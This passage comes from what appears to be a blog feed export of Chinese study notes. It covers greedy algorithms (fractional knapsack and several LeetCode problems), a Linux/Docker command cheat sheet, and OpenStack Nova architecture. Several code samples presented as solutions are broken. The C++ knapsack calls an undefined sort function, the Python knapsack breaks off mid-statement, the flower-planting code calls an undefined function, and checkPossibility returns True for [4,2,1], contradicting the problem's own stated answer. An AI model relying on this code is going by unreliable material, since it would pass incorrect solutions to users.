srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>思路：</p><ul><li>计算每种物品的单位重量的价值$\frac{v_i}{w_i}$</li><li>根据贪心选择策略，将尽可能多的单位重量价值高的物品装入背包</li><li>接着选择单位价值次高的物品并尽可能多地装入背包</li><li>依次类推，直到背包装满为止</li></ul><p><strong>C++示例代码</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">knapsack</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">double</span> M, <span class="keyword">double</span> v[], <span class="keyword">double</span> w[], <span class="keyword">double</span> x[])</span></span>;<span class="comment">// 背包算法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;背包问题的贪心算法\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> n = <span class="number">4</span>;<span class="comment">// 物品个数</span></span><br><span class="line"><span class="keyword">double</span> C = <span class="number">50</span>;<span class="comment">// 背包所能容纳的重量</span></span><br><span class="line"><span class="keyword">double</span> x[n + <span class="number">1</span>];<span class="comment">// 物品选择向量</span></span><br><span class="line"><span class="keyword">double</span> w[] = &#123; <span class="number">0</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span> &#125;;<span class="comment">// 下标从1开始，物品i的重量（已按单位价值减序排序）</span></span><br><span class="line"><span class="keyword">double</span> v[] = &#123; <span class="number">0</span>,<span class="number">60</span>,<span class="number">100</span>,<span class="number">120</span>,<span class="number">120</span> &#125;;<span class="comment">// 下标从1开始，物品i的价值（已按单位价值减序排序）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;背包所能容纳的重量为：&quot;</span> &lt;&lt; C &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;物品的重量和价值分别为：&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]:(&quot;</span> &lt;&lt; w[i] &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; v[i] &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">knapsack(n, C, w, v, x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n物品选择向量为：(&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; x[i];</span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> &lt;= n)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;)\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">knapsack</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">double</span> C, <span class="keyword">double</span> w[], <span class="keyword">double</span> v[], <span class="keyword">double</span> x[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 对物品按单位价值排序</span></span><br><span class="line">sort(n, w, v);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 所有元素设为0，背包初始状态（没有装入任何物品）</span></span><br><span class="line"><span class="built_in">memset</span>(x, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">double</span>) * (n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">// 第 i 个物品</span></span><br><span class="line"><span class="keyword">double</span> c = C;<span class="comment">// 背包剩余容量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 物品i整件被装下，x[i]=1</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt;= n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (w[i] &gt; c)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">x[i] = <span class="number">1</span>;</span><br><span class="line">c -= w[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 物品i只有部分被装下，x[i] = c / w[i];</span></span><br><span class="line"><span class="keyword">if</span> (i &lt;= n)</span><br><span class="line">x[i] = c / w[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 背包容量</span></span><br><span class="line">c = <span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 物品种类</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 物品重量数组</span></span><br><span class="line">weights = [<span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 物品价值数组</span></span><br><span class="line">values = [<span class="number">50</span>, <span class="number">80</span>, <span class="number">45</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">knapsack</span>(<span class="params">weights, values, n ,c</span>):</span></span><br><span class="line">    v = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        v.append(values[i] / weights[i])</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">sorted</span>(v)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> c &gt; </span><br><span class="line">    </span><br><span class="line">knapsack(weights, values, n, c)</span><br></pre></td></tr></table></figure><pre><code>[10.0, 8.0, 3.0]</code></pre><h2 id="练习巩固"><a href="#练习巩固" class="headerlink" title="练习巩固"></a>练习巩固</h2><h3 id="605-种花问题（简单）"><a href="#605-种花问题（简单）" class="headerlink" title="605. 种花问题（简单）"></a>605. 种花问题（简单）</h3><p><strong>题目描述：</strong><br>假设你有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花卉不能种植在相邻的地块上，它们会争夺水源，两者都会死去。</p><p>给定一个花坛（表示为一个数组包含0和1，其中0表示没种植花，1表示种植了花），和一个数 n 。能否在不打破种植规则的情况下种入 n 朵花？能则返回True，不能则返回False。</p><p><strong>示例 1:</strong></p><p>输入: flowerbed = [1,0,0,0,1], n = 1<br>输出: True</p><p><strong>示例 2:</strong></p><p>输入: flowerbed = [1,0,0,0,1], n = 2<br>输出: False<br>注意:</p><p>数组内已种好的花不会违反种植规则。<br>输入的数组长度范围为 [1, 20000]。<br>n 是非负整数，且不会超过输入数组的大小。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法:"></a>方法:</h4><ul><li>给flowerbed左右均添加上<code>[0]</code></li><li>依次遍历<code>i-1、i、i+1</code>位置时候都为0的时候计数器+1.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">f = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">canPlaceFlowers</span>(<span class="params">flowerbed,n</span>):</span></span><br><span class="line">    flowerbed = [<span class="number">0</span>] +  flowerbed</span><br><span class="line">    flowerbed = flowerbed + [<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(flowerbed) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> flowerbed[i - <span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> flowerbed[i] == <span class="number">0</span> <span class="keyword">and</span> flowerbed[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br><span class="line">            flowerbed[i] = <span class="number">1</span></span><br><span class="line">            print(i)</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">0</span>:<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">countFlower(f,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><pre><code>1True</code></pre><h3 id="452-用最少数量的箭引爆气球（中等）"><a href="#452-用最少数量的箭引爆气球（中等）" class="headerlink" title="-452. 用最少数量的箭引爆气球（中等）"></a>-452. 用最少数量的箭引爆气球（中等）</h3><p>在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标。 <br></p><p>一支弓箭可以沿着 $x$ 轴从不同点完全垂直地射出。在坐标 x 处射出一支箭，若有一个气球的直径的开始和结束坐标为 $xstart$，$xend$， 且满足$xstart ≤ x ≤ xend$，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。<br></p><p>给你一个数组$points$，其中 $points [i] = [xstart,xend]$，返回引爆所有气球所必须射出的最小弓箭数。<br></p><p><strong>示例 1：</strong></p><p>输入：$points = [[10,16],[2,8],[1,6],[7,12]]$ <br><br>输出：2 <br><br>解释：对于该样例，$x = 6$ 可以射爆 $[2,8],[1,6]$ 两个气球，以及$x = 11$射爆另外两个气球<br></p><p><strong>示例 2：</strong></p><p>输入：$points = [[1,2],[3,4],[5,6],[7,8]]$ <br><br>输出：4 <br></p><p><strong>示例 3：</strong></p><p>输入：$points = [[1,2],[2,3],[3,4],[4,5]] $<br><br>输出：2 <br></p><p><strong>示例 4：</strong></p><p>输入：$points = [[1,2]]$ <br><br>输出：1 <br></p><p><strong>示例 5：</strong></p><p>输入：$points = [[2,3],[2,3]]$<br><br>输出：1<br></p><p><strong>提示：</strong><br>$$0 &lt;= points.length &lt;= 104 $$<br>$$points[i].length == 2 $$<br>$$-231 &lt;= xstart &lt; xend &lt;= 231 - 1$$</p><h3 id="763-划分字母区间（中等）"><a href="#763-划分字母区间（中等）" class="headerlink" title="-763. 划分字母区间（中等）"></a>-763. 划分字母区间（中等）</h3><p>字符串 S 由小写字母组成。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。返回一个表示每个字符串片段的长度的列表。</p><p> </p><p>示例：</p><p>输入：S = “ababcbacadefegdehijhklij”<br>输出：[9,7,8]<br>解释：<br>划分结果为 “ababcbaca”, “defegde”, “hijhklij”。<br>每个字母最多出现在一个片段中。<br>像 “ababcbacadefegde”, “hijhklij” 的划分是错误的，因为划分的片段数较少。</p><p>提示：</p><p>S的长度在[1, 500]之间。<br>S只包含小写字母 ‘a’ 到 ‘z’ 。</p><h3 id="122-买卖股票的最佳时机-II（简单）"><a href="#122-买卖股票的最佳时机-II（简单）" class="headerlink" title="-122. 买卖股票的最佳时机 II（简单）"></a>-122. 买卖股票的最佳时机 II（简单）</h3><p>给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。</p><p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p><p>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p><p> </p><p>示例 1:</p><p>输入: [7,1,5,3,6,4]<br>输出: 7<br>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。<br>     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。<br>示例 2:</p><p>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。<br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。<br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。<br>示例 3:</p><p>输入: [7,6,4,3,1]<br>输出: 0<br>解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</p><p>提示：</p><p>1 &lt;= prices.length &lt;= 3 * 10 ^ 4<br>0 &lt;= prices[i] &lt;= 10 ^ 4</p><h3 id="406-根据身高重建队列（中等）"><a href="#406-根据身高重建队列（中等）" class="headerlink" title="-406. 根据身高重建队列（中等）"></a>-406. 根据身高重建队列（中等）</h3><p>假设有打乱顺序的一群人站成一个队列，数组 people 表示队列中一些人的属性（不一定按顺序）。每个 people[i] = [hi, ki] 表示第 i 个人的身高为 hi ，前面 正好 有 ki 个身高大于或等于 hi 的人。</p><p>请你重新构造并返回输入数组 people 所表示的队列。返回的队列应该格式化为数组 queue ，其中 queue[j] = [hj, kj] 是队列中第 j 个人的属性（queue[0] 是排在队列前面的人）。</p><p> </p><p>示例 1：</p><p>输入：people = [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]<br>输出：[[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]<br>解释：<br>编号为 0 的人身高为 5 ，没有身高更高或者相同的人排在他前面。<br>编号为 1 的人身高为 7 ，没有身高更高或者相同的人排在他前面。<br>编号为 2 的人身高为 5 ，有 2 个身高更高或者相同的人排在他前面，即编号为 0 和 1 的人。<br>编号为 3 的人身高为 6 ，有 1 个身高更高或者相同的人排在他前面，即编号为 1 的人。<br>编号为 4 的人身高为 4 ，有 4 个身高更高或者相同的人排在他前面，即编号为 0、1、2、3 的人。<br>编号为 5 的人身高为 7 ，有 1 个身高更高或者相同的人排在他前面，即编号为 1 的人。<br>因此 [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] 是重新构造后的队列。<br>示例 2：</p><p>输入：people = [[6,0],[5,0],[4,0],[3,2],[2,2],[1,4]]<br>输出：[[4,0],[5,0],[2,2],[3,2],[1,4],[6,0]]</p><p>提示：</p><p>1 &lt;= people.length &lt;= 2000<br>0 &lt;= hi &lt;= 106<br>0 &lt;= ki &lt; people.length<br>题目数据确保队列可以被重建</p><h3 id="665-非递减数列（简单）"><a href="#665-非递减数列（简单）" class="headerlink" title="665. 非递减数列（简单）"></a>665. 非递减数列（简单）</h3><p>给你一个长度为 n 的整数数组，请你判断在 最多 改变 1 个元素的情况下，该数组能否变成一个非递减数列。</p><p>我们是这样定义一个非递减数列的： 对于数组中所有的 i (0 &lt;= i &lt;= n-2)，总满足 nums[i] &lt;= nums[i + 1]。</p><p> </p><p>示例 1:</p><p>输入: nums = [4,2,3]<br>输出: true<br>解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。<br>示例 2:</p><p>输入: nums = [4,2,1]<br>输出: false<br>解释: 你不能在只改变一个元素的情况下将其变为非递减数列。</p><p>说明：</p><ul><li>1 &lt;= n &lt;= 10 ^ 4</li><li>-10 ^ 5 &lt;= nums[i] &lt;= 10 ^ 5</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nums = [<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span>(<span class="params">nums</span>) -&gt; bool:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> nums[i] &gt; nums[i + <span class="number">1</span>]:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count  == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> nums[i - <span class="number">1</span>] &gt; nums[i + <span class="number">1</span>]:</span><br><span class="line">                nums[i + <span class="number">1</span>] = nums[i] <span class="comment">##上移</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nums[i] = nums[i + <span class="number">1</span>] <span class="comment"># 下移</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">checkPossibility(nums)</span><br></pre></td></tr></table></figure><pre><code>True</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux&amp;Docker命令</title>
      <link href="2020/12/05/Linux&amp;Docker%E5%91%BD%E4%BB%A4/"/>
      <url>2020/12/05/Linux&amp;Docker%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>一些记不住的Linux和Docker命令。</p><a id="more"></a><h3 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h3><h5 id="1、添加用户"><a href="#1、添加用户" class="headerlink" title="1、添加用户"></a>1、添加用户</h5><blockquote><p>sudo adduser newuser</p></blockquote><h5 id="2、查看文件用户"><a href="#2、查看文件用户" class="headerlink" title="2、查看文件用户"></a>2、查看文件用户</h5><blockquote><p>cat /etc/group </p></blockquote><h5 id="3、查看服务状态"><a href="#3、查看服务状态" class="headerlink" title="3、查看服务状态"></a>3、查看服务状态</h5><blockquote><p>systemctl status  服务</p></blockquote><h5 id="4、删除文件夹"><a href="#4、删除文件夹" class="headerlink" title="4、删除文件夹"></a>4、删除文件夹</h5><blockquote><p> rm -rf  文件夹名</p></blockquote><h3 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h3><h5 id="1、docker安装"><a href="#1、docker安装" class="headerlink" title="1、docker安装"></a>1、docker安装</h5><ul><li>ubuntu <code>apt-get install docker </code>和<code>apt-get install docker.io</code></li></ul><h5 id="2、docker常用命令"><a href="#2、docker常用命令" class="headerlink" title="2、docker常用命令"></a>2、docker常用命令</h5><ul><li><code>docker images</code>（查看镜像）</li><li><code>docker ps</code>（查看正在运行的容器）</li><li><code>docker ps -a</code>（查看所有已创建的容器）</li><li><code>docker run -dt -p 宿主主机端口：容器端口   镜像 </code>（创建容器并后台运行）</li><li><code>docker exec -it 容器ID /bin/bash</code>（进入容器)</li><li><code>docker start 容器ID</code>(开启容器)</li></ul><h5 id="3、docker与宿主机直接文件互拷贝"><a href="#3、docker与宿主机直接文件互拷贝" class="headerlink" title="3、docker与宿主机直接文件互拷贝"></a>3、docker与宿主机直接文件互拷贝</h5><ul><li><p><a href="https://blog.csdn.net/niu_hao/article/details/69546208">参考链接</a></p></li><li><p><strong>从容器里面拷文件到宿主机</strong></p><blockquote><p>docker cp 容器名：要拷贝的文件在容器里面的路径    要拷贝到宿主机的相应路径</p></blockquote></li><li><p>删除文件夹 rm -rf </p></li><li><p><strong>从宿主机拷文件到容器里面</strong></p><blockquote><p>docker cp 要拷贝的文件路径 容器名：要拷贝到容器里面对应的路径</p><ul><li><p>示例：</p><p>**docker cp /home/humen/Desktop/html 73cbd280d965:/var/www/ **</p></li></ul></blockquote></li></ul><h5 id="4、docker容器虚拟机开机自启动"><a href="#4、docker容器虚拟机开机自启动" class="headerlink" title="4、docker容器虚拟机开机自启动"></a>4、docker容器虚拟机开机自启动</h5><ul><li>docker update –restart=always 容器id</li></ul><h5 id="5-docker-build-使用"><a href="#5-docker-build-使用" class="headerlink" title="5. docker build 使用"></a>5. docker build 使用</h5><p>通过dockerfile创建images  <code>docker build -t php4fun:v0.1 .</code></p><p>/root/mulval</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="2020/07/30/OpenStack%E9%80%9A%E7%94%A8%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
      <url>2020/07/30/OpenStack%E9%80%9A%E7%94%A8%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>每个OpenStack组件可能包含若干子服务，其中必定有一个API服务负责接收客户请求。</p><p>设计API前端好处：</p><ol><li>对外提供统一接口，隐藏实现细节</li><li>提供REST标准调用服务，便于与第三方系统集成</li><li>API高可用</li></ol><h3 id="scheduler"><a href="#scheduler" class="headerlink" title="scheduler"></a>scheduler</h3><p>负责从实体中调度最合适的来执行操作</p><h3 id="worker"><a href="#worker" class="headerlink" title="worker"></a>worker</h3><p>前者调度服务只管分配任务，真正执行任务的是worker工作服务。</p><p>scheduler和worker的存在使得OpenStack扩展方便：</p><ol><li>当计算资源不够无法创建虚拟机时，可以增加计算节点</li><li>当客户的请求里太大调度不过来时，可以增加Schedule</li></ol><h3 id="driver"><a href="#driver" class="headerlink" title="driver"></a>driver</h3><h3 id="rabbit-mq"><a href="#rabbit-mq" class="headerlink" title="rabbit mq"></a>rabbit mq</h3><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="2020/07/30/Nova%E6%9E%B6%E6%9E%84/"/>
      <url>2020/07/30/Nova%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Compute Service Nova 是 OpenStack 最核心的服务，负责维护和管理云环境的计算资源。OpenStack 作为 IaaS 的云操作系统，虚拟机生命周期管理也就是通过 Nova 来实现的。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gh7nrz6xemj30ug0rmne6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gh7nrz6xemj30ug0rmne6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200729105953166"></p><h2 id="Nova子服务"><a href="#Nova子服务" class="headerlink" title="Nova子服务"></a>Nova子服务</h2><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>接收和响应用户的API调用。</p><h3 id="Computer-Core计算核心"><a href="#Computer-Core计算核心" class="headerlink" title="Computer Core计算核心"></a>Computer Core计算核心</h3><p><strong>nove-scheduler</strong>：虚拟机调度服务，负责决定在哪个计算节点上运行虚拟机。</p><p><strong>nova-computer</strong>：管理虚拟机的核心服务，通过Hypervisor API实现虚拟机生命周期管理。</p><p><strong>Hypervisor</strong>：虚拟机管理最底层的程序。</p><p><strong>nova-conductor</strong>：负责nova-computer更新数据库的任务</p><h3 id="Console-Interface控制接口"><a href="#Console-Interface控制接口" class="headerlink" title="Console Interface控制接口"></a>Console Interface控制接口</h3><p><strong>nova-console</strong>：多种方式可访问虚拟机的控制台</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>nova-novncproxy</td><td>基于Web浏览器的VNC访问</td></tr><tr><td>nova-spicehtml5proxy</td><td>基于HTML5浏览器的SPICE访问</td></tr><tr><td>Nova-xvpncproxy</td><td>基于JAVA客户端的VNC访问</td></tr></tbody></table><p><strong>nova-consoleauth</strong>：提供Token认证</p><p><strong>nova-cert</strong>：提供x509证书支持</p><h3 id="Database数据库"><a href="#Database数据库" class="headerlink" title="Database数据库"></a>Database数据库</h3><p>nova一些数据存储于名为“nova”的数据库中</p><h3 id="Message-Queue消息队列"><a href="#Message-Queue消息队列" class="headerlink" title="Message Queue消息队列"></a>Message Queue消息队列</h3><p>RabbitMQ</p><h2 id="物理部署"><a href="#物理部署" class="headerlink" title="物理部署"></a>物理部署</h2><p>Nova主要部署在计算节点和控制节点，利用<code>ps -elf| grep nova</code>来查看运行的nova子服务。</p><h3 id="虚拟机创建流程"><a href="#虚拟机创建流程" class="headerlink" title="虚拟机创建流程"></a>虚拟机创建流程</h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gh8rkw2dawj312q0qs7ae.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gh8rkw2dawj312q0qs7ae.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200730095700243"></p><p>客户机向API发送请求，API对请求做一些必要的处理后，向Messaging请求让Scheduler创建一个虚拟机，Scheduler获得请求后执行调度算法，从若干计算节点中选出节点A，让Messaging在计算节点A上创建虚拟机，则计算节点A的Hypervisor上启动虚拟机，若此过程需要查询或更新数据库信息，则会通过conductor访问数据库。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>容器安全概述.md</title>
      <link href="2020/07/22/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/"/>
      <url>2020/07/22/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/</url>
      
